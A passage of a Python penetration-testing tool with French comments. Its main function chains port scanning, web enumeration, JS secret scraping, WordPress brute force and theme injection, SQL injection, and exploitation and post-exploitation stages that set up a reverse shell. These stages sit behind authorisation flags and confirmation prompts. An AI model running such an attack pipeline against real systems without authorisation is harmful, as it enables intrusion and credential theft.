            warn(f"LHOST sauvegardé `{saved}` n'est plus actif (VPN déconnecté ?)")

    # ── Cas 3 : auto-détection ────────────────────────────────────────────────
    detected = _detect_lhost()
    if detected:
        info(f"LHOST auto-détecté : `{detected}`")
        _save_lhost(cfg.workspace, detected)
        return cfg._replace(lhost=detected)

    # ── Cas 4 : prompt CLI ────────────────────────────────────────────────────
    warn("LHOST introuvable — le reverse shell sera désactivé sans IP valide.")
    if cfg.ui == "cli":
        try:
            prompt_hint = f" (dernier: {saved})" if saved else ""
            if RICH:
                from rich.prompt import Prompt as _Prompt
                answer = _Prompt.ask(
                    f"[yellow]IP VPN/tun0 pour le reverse shell{prompt_hint}[/yellow] "
                    "(vide = désactiver)",
                    default=saved or ""
                ).strip()
            else:
                answer = input(f"IP VPN pour reverse shell{prompt_hint} (vide = désactiver): ").strip()

            if answer and _re.match(ip_pattern, answer):
                _save_lhost(cfg.workspace, answer)
                ok(f"LHOST défini et sauvegardé : {answer}")
                return cfg._replace(lhost=answer)
            else:
                warn("LHOST ignoré — initial access désactivé.")
        except (EOFError, KeyboardInterrupt):
            warn("LHOST ignoré — initial access désactivé.")

    return cfg

def print_summary(cfg: Config, run_dir: Path, services: List[dict], urls: List[str], findings: List[dict], report_md: Path, timings: Dict[str, float]) -> None:
    if not RICH:
        ok(f"Résumé: {len(services)} services, {len(urls)} urls, {len(findings)} findings.")
        ok(f"Report: {report_md}")
        return

    timing_lines = "\n".join([f"[bold]{k}:[/bold] {v:.1f}s" for k, v in timings.items()])
    body = (
        f"[bold]Run dir:[/bold] {run_dir}\n"
        f"[bold]Preset:[/bold] {cfg.preset}\n"
        f"[bold]Services:[/bold] {len(services)}\n"
        f"[bold]URLs:[/bold] {len(urls)}\n"
        f"[bold]Findings:[/bold] {len(findings)}\n\n"
        f"{timing_lines}\n\n"
        f"[bold]Report:[/bold] {report_md}"
    )
    console.print(Panel(body, title="Résumé", border_style="green"))

def launch_webui(cfg: Config) -> None:
    import webbrowser

    base = Path(__file__).resolve().parent
    webui = base / "webui" / "app.py"
    if not webui.exists():
        eprint(f"WebUI introuvable: {webui}")
        sys.exit(1)

    env = os.environ.copy()
    env["PENTOOL_PATH"] = str(Path(__file__).resolve())
    env["PENTOOL_WORKSPACE"] = str(cfg.workspace.resolve())
    env["PENTOOL_WEB_HOST"] = cfg.web_host
    env["PENTOOL_WEB_PORT"] = str(cfg.web_port)

    url = f"http://{cfg.web_host}:{cfg.web_port}"
    info(f"WebUI: {url}")

    if not cfg.no_browser:
        def _open():
            time.sleep(0.8)
            try:
                webbrowser.open(url)
            except Exception:
                pass
        threading.Thread(target=_open, daemon=True).start()

    subprocess.run(["python3", str(webui)], env=env, check=False)

# -------------------- MAIN --------------------
def main() -> None:
    install_cleanup_handlers()   # v0.65 : Ctrl-C tue proprement ffuf/nmap/nuclei
    cfg = parse_args()

    if cfg.ui == "web":
        launch_webui(cfg)
        return

    prechecks(cfg, show_table=True)

    # ── Wordlists : vérification + download SecLists si besoin ──
    setup_wordlists(cfg)

    # ── Résumé config + confirmation avant lancement ──
    if not show_config_summary(cfg):
        info("Scan annulé par l'utilisateur.")
        sys.exit(0)

    legal_gate(cfg)
    cfg = lhost_gate(cfg)  # Prompt si lhost manquant et exploitation active

    run_dir = cfg.workspace / safe_name(cfg.target) / safe_name(cfg.run_id)
    logs_dir = run_dir / "logs"
    logs_dir.mkdir(parents=True, exist_ok=True)

    # ── Config JSON pour le WebUI (badges activés) ────────────────────────
    _enabled: list = ["st_ports", "st_report"]
    if cfg.staged_nmap:                  _enabled.append("st_enum")
    if not cfg.no_vuln:                  _enabled.append("st_vuln")
    if cfg.run_searchsploit:             _enabled.append("st_searchsploit")
    if cfg.run_nuclei:                   _enabled.append("st_nuclei")
    if cfg.run_enum4linux:               _enabled.append("st_enum4linux")
    if not cfg.no_web:                   _enabled.append("st_web")
    if not cfg.no_web and cfg.run_robots:    _enabled.append("st_robots")
    if not cfg.no_web and cfg.run_js_scrape: _enabled.append("st_js")
    if not cfg.no_web and cfg.run_git_check: _enabled.append("st_git")
    if cfg.run_archive_crack:            _enabled.append("st_archives")
    if cfg.run_wp_brute:                 _enabled += ["st_wpscan", "st_wordpress"]
    if cfg.run_wp_exploit:               _enabled.append("st_wpexploit")
    if cfg.run_exploit:                  _enabled += ["st_exploit", "st_ftp", "st_ssh"]
    if cfg.run_exploit and cfg.run_postexploit: _enabled.append("st_postexploit")
    try:
        (logs_dir / "_config.json").write_text(
            json.dumps({"enabled_stages": _enabled}, ensure_ascii=False),
            encoding="utf-8"
        )
    except Exception as _exc:
        warn(f"[main] {_exc}")

    info(f"Target: {cfg.target}")
    info(f"Run dir: {run_dir}")
    info(f"Preset: {cfg.preset} | Staged Nmap: {cfg.staged_nmap} | scan-mode: {cfg.scan_mode}")

    web_runner: Optional[WebEnumRunner] = None
    if not cfg.no_web and cfg.web_early:
        web_runner = WebEnumRunner(cfg, logs_dir)
        web_runner.start()
        info(f"Web early activé: max_urls={cfg.max_web_urls}, max_gobuster={cfg.max_gobuster}, gobuster_t={cfg.gobuster_threads}")

    timings: Dict[str, float] = {}
    t0 = time.time()

    # Pré-initialisation pour la closure du rapport partiel (atexit)
    services:  List[dict]             = []
    findings:  List[dict]             = []
    urls:      List[str]              = []
    web_logs:  Dict[str, List[str]]   = {"whatweb": [], "nikto": [], "gobuster": [], "ffuf": []}
    nmap_xml_for_searchsploit: Optional[Path] = None

    # ── Rapport partiel si scan interrompu (Stop / SIGTERM / crash) ──────
    # atexit tourne dès que le process se termine, quelle qu'en soit la raison.
    # Si le scan s'est terminé normalement, _scan_complete=True → on skip.
    _scan_complete = False

    def _partial_report_on_exit() -> None:
        if _scan_complete:
            return                          # rapport déjà généré → rien à faire
        warn("\n[!] Scan interrompu — génération du rapport partiel avec les données collectées...")
        try:
            timings.setdefault("total", time.time() - t0)
            timings["interrupted"] = True   # flag pour le rapport HTML (bandeau orange)
            if REPORTING_EXT:
                _cfg_d = {**asdict(cfg), "workspace": str(cfg.workspace), "wordlist": str(cfg.wordlist)}
                _rpts  = _generate_reports_ext(
                    run_dir, APP_NAME, VERSION,
                    _cfg_d, services, findings, urls, web_logs, timings,
                )
                ok(f"[Rapport partiel] MD  → {_rpts.get('md', '?')}")
                ok(f"[Rapport partiel] JSON→ {_rpts.get('json', '?')}")
            else:
                _rmd = write_report(run_dir, cfg, services, findings, urls, web_logs, timings)
                ok(f"[Rapport partiel] {_rmd}")
        except Exception as _rpe:
            warn(f"[!] Rapport partiel : erreur génération : {_rpe}")
        try:
            _clear_stage(logs_dir)
        except Exception as _exc:
            warn(f"[main] {_exc}")

    atexit.register(_partial_report_on_exit)

    def on_open_port(p: int) -> None:
        if web_runner is not None:
            web_runner.submit_open_port(p)

    if cfg.staged_nmap:
        t = time.time()
        _signal_stage(logs_dir, "nmap_ports")
        ports_xml = _run_safe("nmap_ports_discovery", nmap_ports_discovery,
                               cfg, logs_dir,
                               on_open_port=on_open_port if web_runner else None)
        timings["nmap_ports"] = _elapsed(t)

        ports_services = parse_nmap_xml(ports_xml) if ports_xml else []
        ports = _ports_arg(ports_services)

        if not ports:
            warn("Aucun port open détecté sur la phase ports discovery.")
            services = ports_services
            nmap_xml_for_searchsploit = ports_xml
        else:
            info(f"Ports ouverts détectés: {ports}")
            t = time.time()
            _signal_stage(logs_dir, "nmap_enum")
            _nmap_enum_res = _run_safe("nmap_enum_services", nmap_enum_services,
                                       cfg, ports, logs_dir,
                                       default=(None, ""))
            enum_xml, _enum_out = _nmap_enum_res
            timings["nmap_enum"] = _elapsed(t)

            services = parse_nmap_xml(enum_xml) if enum_xml else []
            nmap_xml_for_searchsploit = enum_xml

            # Fallback : si le scan -sC -sV n'a rien retourné (ports filtrés lors
            # de la 2e passe), on réutilise les ports de la découverte initiale
            # en créant des entrées minimales (pas de version, mais les ports sont là).
            if not services and ports_services:
                warn("Nmap enum sans résultat (ports filtrés/ralentis) — fallback sur ports discovery")
                services = ports_services
    else:
        t = time.time()
        _signal_stage(logs_dir, "nmap_enum")
        _nmap_single_res = _run_safe("nmap_single_pass", nmap_single_pass,
                                     cfg, logs_dir,
                                     on_open_port=on_open_port if web_runner else None,
                                     default=(None, ""))
        enum_xml, _enum_out = _nmap_single_res
        timings["nmap_single"] = _elapsed(t)
        services = parse_nmap_xml(enum_xml) if enum_xml else []
        nmap_xml_for_searchsploit = enum_xml

    show_services_table(services)

    findings: List[dict] = []
    if not cfg.no_vuln:
        t = time.time()
        _signal_stage(logs_dir, "nmap_vuln")
        f_vuln = _run_safe("nmap_vuln", run_nmap_vuln, cfg, services, logs_dir)
        timings["nmap_vuln"] = _elapsed(t)
        if f_vuln:
            findings.append(f_vuln)

    if cfg.run_searchsploit and nmap_xml_for_searchsploit is not None:
        t = time.time()
        _signal_stage(logs_dir, "searchsploit")
        f_ss = _run_safe("searchsploit", run_searchsploit, cfg, nmap_xml_for_searchsploit, logs_dir)
        timings["searchsploit"] = _elapsed(t)
        if f_ss:
            findings.append(f_ss)

    # ── enum4linux-ng : déclenché automatiquement si SMB détecté ──
    if cfg.run_enum4linux:
        t = time.time()
        _signal_stage(logs_dir, "enum4linux")
        f_smb = _run_safe("enum4linux_ng", run_enum4linux_ng, cfg, services, logs_dir)
        timings["enum4linux"] = _elapsed(t)
        if f_smb:
            findings.append(f_smb)

    urls: List[str] = []
    web_logs: Dict[str, List[str]] = {"whatweb": [], "nikto": [], "gobuster": [], "ffuf": []}

    if cfg.no_web:
        warn("Web enum désactivé (--no-web)")
    else:
        discovered_urls = pick_http_urls(cfg.target, services, probe_timeout=cfg.probe_timeout)

        if web_runner is not None:
            for u in discovered_urls:
                web_runner.submit_url(u)
            t = time.time()
            _signal_stage(logs_dir, "web_enum")
            web_logs = web_runner.wait()
            timings["web_enum"] = _elapsed(t)
            urls = web_runner.urls
            web_runner.shutdown()
        else:
            urls = discovered_urls
            if urls:
                info("URLs détectées: " + ", ".join(urls))
                t = time.time()
                _signal_stage(logs_dir, "web_enum")
                web_logs = _run_safe("web_tools", run_web_tools, cfg, urls, logs_dir,
                                     default={"whatweb": [], "nikto": [], "gobuster": [], "ffuf": []})
                timings["web_enum"] = _elapsed(t)
            else:
                warn("Aucun service HTTP/HTTPS détecté -> SKIP web enum")

    # ── ffuf followup : explore les répertoires/fichiers découverts ───────
    if not cfg.no_web and web_logs.get("ffuf"):
        t = time.time()
        _ffuf_res = _run_safe("ffuf_followup", run_ffuf_followup, cfg, web_logs, logs_dir,
                               default=([], []))
        extra_urls, ffuf_extra_findings = _ffuf_res
        timings["ffuf_followup"] = _elapsed(t)
        findings.extend(ffuf_extra_findings)
        for u in extra_urls:
            if u not in urls:
                urls.append(u)
                info(f"[ffuf followup] Nouvelle URL ajoutée au pipeline: {u}")

    # ── robots.txt / sitemap.xml ──────────────────────────────────────────
    if not cfg.no_web and urls:
        t = time.time()
        _signal_stage(logs_dir, "robots")
        robot_urls = _run_safe("robots_recon", run_robots_recon, cfg, urls, logs_dir, default=[])
        timings["robots"] = _elapsed(t)
        for u in robot_urls:
            if u not in urls:
                urls.append(u)

    # ── JS scraper ────────────────────────────────────────────────────────
    if not cfg.no_web and urls:
        t = time.time()
        _signal_stage(logs_dir, "js_scrape")
        js_findings = _run_safe("js_scraper", run_js_scraper, cfg, urls, logs_dir,
                                default={"secrets": [], "endpoints": []})
        timings["js_scraper"] = _elapsed(t)
        if js_findings.get("secrets"):
            findings.append({
                "severity": "high",
                "title": f"Secrets trouvés dans JS ({len(js_findings['secrets'])})",
                "source": "js_scraper",
                "evidence_file": str(logs_dir / "js_scraper.txt"),
            })
        # Ajoute les endpoints JS découverts au crawl
        for ep in js_findings.get("endpoints", [])[:20]:
            for base in urls[:2]:
                ep_url = base.rstrip("/") + ep
                if ep_url not in urls:
                    urls.append(ep_url)

    # ── .git exposure check ───────────────────────────────────────────────
    if not cfg.no_web and urls:
        t = time.time()
        _signal_stage(logs_dir, "git_check")
        git_finding = _run_safe("git_exposure_check", run_git_exposure_check, cfg, urls, logs_dir)
        timings["git_check"] = _elapsed(t)
        if git_finding:
            findings.append(git_finding)

    # ── Archive analysis (sur les fichiers téléchargés par ffuf followup) ─
    t = time.time()
    _signal_stage(logs_dir, "archives")
    arc_finding = _run_safe("archive_analysis", run_archive_analysis, cfg, logs_dir)
    timings["archives"] = _elapsed(t)
    if arc_finding:
        findings.append(arc_finding)

    # ── GPG decrypt (clés privées + fichiers .gpg trouvés) ────────────────
    if which("gpg"):
        t = time.time()
        _signal_stage(logs_dir, "gpg")
        gpg_finding = _run_safe("gpg_decrypt", run_gpg_decrypt, cfg, logs_dir)
        timings["gpg"] = _elapsed(t)
        if gpg_finding:
            findings.append(gpg_finding)
            # Si des creds sont extraits → les passer au module FTP/SSH
            if gpg_finding.get("creds"):
                info(f"[GPG] Credentials disponibles pour FTP/SSH: {gpg_finding['creds'][:3]}")

    # ── WordPress recon automatique (dès qu'un WP est détecté) ──────────────
    t = time.time()
    _signal_stage(logs_dir, "wpscan_recon")
    wp_recon_finding = _run_safe("wpscan_recon", run_wpscan_recon, cfg, urls, logs_dir)
    timings["wp_recon"] = _elapsed(t)
    if wp_recon_finding:
        findings.append(wp_recon_finding)

    # ── WordPress brute force (optionnel — checkbox WebUI) ────────────────
    if cfg.run_wp_brute:
        _wp_bf_urls = [u for u in urls if any(kw in u for kw in ["/wp-", "wordpress", "wp-login"])]
        if _wp_bf_urls:
            import urllib.parse as _up_wpbf
            _wp_bf_p = _up_wpbf.urlparse(_wp_bf_urls[0])
            _wp_bf_base = f"{_wp_bf_p.scheme}://{_wp_bf_p.netloc}"
        else:
            _wp_bf_base = f"http://{cfg.target}"
        _clear_stage(logs_dir)   # wpscan_recon terminé → badge vert avant d'attendre la confirmation
        if _webui_confirm(
            cfg,
            action_id="wp_bruteforce",
            title="Brute Force WordPress — attaque par dictionnaire",
            details=(
                f"Lancer une attaque par dictionnaire sur l'interface XML-RPC de WordPress ({_wp_bf_base}). "
                "Tente de deviner les mots de passe des comptes détectés. "
                "Génère un volume important de requêtes — peut déclencher des alertes ou bloquer des comptes."
            ),
        ):
            t = time.time()
            _signal_stage(logs_dir, "wordpress_brute")
            wp_finding = _run_safe("wordpress_bruteforce", run_wordpress_bruteforce, cfg, urls, logs_dir)
            timings["wp_brute"] = _elapsed(t)
            if wp_finding:
                findings.append(wp_finding)
        else:
            warn("[WP Brute] Brute force WordPress → refusé par l'utilisateur")

    # ── WordPress post-exploitation — Theme Injection (opt-in) ───────────
    if cfg.run_wp_exploit and cfg.authorized:
        wp_creds_found: List[dict] = []
        for _f in findings:
            if _f.get("source") == "wordpress_bruteforce" and _f.get("creds"):
                wp_creds_found.extend(_f["creds"])
        # Détecter l'URL WordPress — extraire uniquement scheme+host (pas le chemin)
        _wp_urls = [u for u in urls if any(kw in u for kw in ["/wp-", "wordpress"])]
        if _wp_urls:
            import urllib.parse as _up_wp
            _wp_parsed = _up_wp.urlparse(_wp_urls[0])
            _wp_base = f"{_wp_parsed.scheme}://{_wp_parsed.netloc}"
        else:
            _wp_base = f"http://{cfg.target}"
        # Ajouter les hint credentials en tête de liste s'ils sont définis
        if cfg.hint_username and cfg.hint_password:
            hint_cred = {"user": cfg.hint_username, "password": cfg.hint_password}
            if hint_cred not in wp_creds_found:
                wp_creds_found.insert(0, hint_cred)
                info(f"[WP Exploit] Hint credentials ajoutés : {cfg.hint_username}:***")
        if wp_creds_found:
            t = time.time()
            _signal_stage(logs_dir, "wp_exploit")
            wp_exploit_f = _run_safe("wordpress_theme_inject", run_wordpress_theme_inject,
                                     cfg, _wp_base, wp_creds_found, logs_dir)
            timings["wp_theme_inject"] = _elapsed(t)
            if wp_exploit_f:
                findings.append(wp_exploit_f)
        else:
            warn("[WP Exploit] Aucun credential WP disponible — utilisez --username/--password ou --wp-brute")

    # ── Web Auth — login automatique (session partagée) ───────────────────
    web_session = None
    web_cookie  = None
    if cfg.web_auth and urls:
        t = time.time()
        info(f"Web auth — tentative de login ({cfg.web_auth.split(':')[0]})")
        _web_auth_res = _run_safe("web_auth", run_web_auth, cfg, urls, logs_dir, default=(None, None))
        web_session, web_cookie = _web_auth_res
        timings["web_auth"] = _elapsed(t)
        if web_session:
            ok(f"[+] Session authentifiée obtenue")
        else:
            warn("Web auth : login échoué ou non détecté")

    # ── Web Crawl — extraction formulaires et paramètres ──────────────────
    # Si une session est disponible, le crawl explore les pages authentifiées
    crawl_data: dict = {"forms": [], "params": [], "endpoints": []}
    if (cfg.run_web_crawl or cfg.run_xss or cfg.run_sqlmap) and urls:
        t = time.time()
        crawl_data = _run_safe("web_crawl", run_web_crawl, cfg, urls, logs_dir,
                               default={"forms": [], "params": [], "endpoints": []})
        timings["web_crawl"] = _elapsed(t)

    # ── XSS scan — détection Cross-Site Scripting ─────────────────────────
    if cfg.run_xss and urls:
        t = time.time()
        f_xss = _run_safe("xss_scan", run_xss_scan, cfg, urls, crawl_data, logs_dir, session=web_session)
        timings["xss_scan"] = _elapsed(t)
        if f_xss:
            findings.append(f_xss)

    # ── SQLmap — injection SQL automatique ────────────────────────────────
    if cfg.run_sqlmap and (urls or crawl_data.get("forms")):
        t = time.time()
        # Passer les cookies d'auth à sqlmap si disponibles
        if web_cookie and cfg.run_sqlmap:
            info(f"sqlmap : cookie d'auth transmis ({web_cookie[:40]}...)")
        f_sqlmap = _run_safe("sqlmap_scan", run_sqlmap_scan, cfg, urls, crawl_data, logs_dir)
        timings["sqlmap"] = _elapsed(t)
        if f_sqlmap:
            findings.append(f_sqlmap)
            if f_sqlmap.get("found_creds"):
                info(f"[+] {len(f_sqlmap['found_creds'])} credential(s) extraits via SQLi")

    # ── Nuclei : vuln scan moderne (après web enum pour avoir les URLs) ──
    if cfg.run_nuclei:
        t = time.time()
        _signal_stage(logs_dir, "nuclei")
        f_nuclei = _run_safe("nuclei_scan", run_nuclei_scan, cfg, urls, services, logs_dir)
        timings["nuclei"] = _elapsed(t)
        if f_nuclei:
            findings.append(f_nuclei)

    # ── Phase exploitation (v0.66) ──────────────────────────────────────
    exploit_findings: List[dict] = []
    if cfg.run_exploit:
        if not cfg.authorized:
            bad("--exploit nécessite --authorized (autorisation explicite). Skipping.")
        else:
            t = time.time()
            # Passe le fichier .nmap de l'étape enum pour la détection FTP anon
            nmap_text_path = (
                logs_dir / "nmap_enum.nmap" if cfg.staged_nmap
                else logs_dir / "nmap.nmap"
            )
            _signal_stage(logs_dir, "exploit")
            exploit_findings = _run_safe("exploitation_phase", run_exploitation_phase,
                                         cfg, services, nmap_text_path, logs_dir, default=[])
            timings["exploitation"] = _elapsed(t)
            findings.extend(exploit_findings)

    # ── Phase Post-exploitation (v0.67) ─────────────────────────────────────
    postexploit_findings: List[dict] = []
    if cfg.run_exploit and cfg.run_postexploit:
        _has_shell = any(
            f.get("writable_dirs") or f.get("source") in ("exploit_ftp", "exploit_smb")
            for f in exploit_findings
        )
        _postexploit_details = (
            f"Établir un accès initial sur {cfg.target} (reverse shell FTP ou SSH) "
            "puis lancer l'énumération interne : sudo, crontab, SUID, réseau, secrets. "
            "Cette phase modifie l'état de la cible (dépôt de fichiers, connexions actives)."
        )
        _clear_stage(logs_dir)   # exploit phase terminée → badges verts avant confirmation
        if _webui_confirm(
            cfg,
            action_id="postexploit",
            title="Phase Post-Exploitation — accès initial + énumération interne",
            details=_postexploit_details,
        ):
            t = time.time()
            _signal_stage(logs_dir, "postexploit")
            postexploit_findings = _run_safe("postexploit_phase", run_postexploit_phase,
                                             cfg, services, exploit_findings, logs_dir, default=[])
            timings["post_exploitation"] = _elapsed(t)
            findings.extend(postexploit_findings)
        else:
            warn("[Post-Exploit] Phase post-exploitation → refusée par l'utilisateur")

    timings["total"] = _elapsed(t0)

    _signal_stage(logs_dir, "report")
    info("Génération reporting")
    if REPORTING_EXT:
        cfg_dict = {**asdict(cfg), "workspace": str(cfg.workspace), "wordlist": str(cfg.wordlist)}
        reports = _generate_reports_ext(run_dir, APP_NAME, VERSION, cfg_dict, services, findings, urls, web_logs, timings)
        report_md = reports["md"]
        ok(f"Reports générés: MD + JSON + HTML")
        ok(f"  → {reports['md']}")
        ok(f"  → {reports['json']}")
        ok(f"  → {reports['html']}")
    else:
        warn("Module reporting.py non trouvé — fallback report basique")
        report_md = write_report(run_dir, cfg, services, findings, urls, web_logs, timings)
        ok(f"Report généré: {report_md}")

    # ✅ Correctif cfg passé à print_summary
    print_summary(cfg, run_dir, services, urls, findings, report_md, timings)
    _scan_complete = True   # empêche _partial_report_on_exit de régénérer le rapport
    _clear_stage(logs_dir)

if __name__ == "__main__":
    main()
